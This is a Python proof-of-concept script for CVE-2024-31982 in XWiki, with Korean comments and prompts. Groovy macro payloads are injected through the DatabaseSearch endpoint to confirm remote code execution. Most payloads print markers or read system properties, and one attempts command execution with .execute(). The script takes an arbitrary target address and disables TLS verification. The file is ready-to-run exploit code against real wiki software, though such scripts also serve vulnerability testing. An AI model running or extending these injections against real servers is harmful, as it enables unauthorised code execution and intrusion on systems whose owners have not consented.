# SPDX-FileCopyrightText: © 2024 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests
from urllib.parse import urlencode

def test_cve_2024_31982_payloads(target):
    if target.startswith("http://") or target.startswith("https://"):
        base_url = target.rstrip('/')
    else:
        base_url = f"http://{target.rstrip('/')}"

    path = "/xwiki/bin/get/Main/DatabaseSearch"

    # 테스트용 Groovy 기반 페이로드들
    payloads = [
        "{{groovy}}println('vulnerable'){{/groovy}}",
        "{{groovy}}println('user=' + System.getProperty('user.name')){{/groovy}}",
        "{{groovy}}println('os=' + System.getProperty('os.name')){{/groovy}}",
        "{{groovy}}println('test:' + (23+19)){{/groovy}}",
        "{{groovy}}'vuln'.execute(){{/groovy}}",  # 명령 실행 시도
    ]

    headers = {
        "User-Agent": "XWiki-CVE-2024-31982-Tester",
        "Accept": "*/*",
        "Connection": "close"
    }

    for i, groovy_code in enumerate(payloads, 1):
        query_params = {
            "outputSyntax": "plain",
            "text": groovy_code
        }

        full_url = f"{base_url}{path}?" + urlencode(query_params)
        print(f"\n[{i}] 요청 URL:\n{full_url}")

        try:
            response = requests.get(full_url, headers=headers, timeout=10, verify=False)
            print(f"HTTP 상태 코드: {response.status_code}")

            if response.status_code == 200:
                if "vulnerable" in response.text or "user=" in response.text or "os=" in response.text or "test:" in response.text:
                    print("[✅] 취약 가능성 있음 - 응답 내 Groovy 코드 실행 결과 확인됨:")
                    print(response.text.strip())
                else:
                    print("[-] 응답은 정상이나 코드 실행 여부 불분명:")
                    print(response.text.strip())
            else:
                print("[-] 요청 실패 또는 응답 비정상")

        except Exception as e:
            print(f"[!] 요청 중 예외 발생: {e}")

if __name__ == "__main__":
    target = input("테스트할 대상 XWiki 주소를 입력하세요 (예: 192.168.1.100 또는 https://example.com): ").strip()
    test_cve_2024_31982_payloads(target)
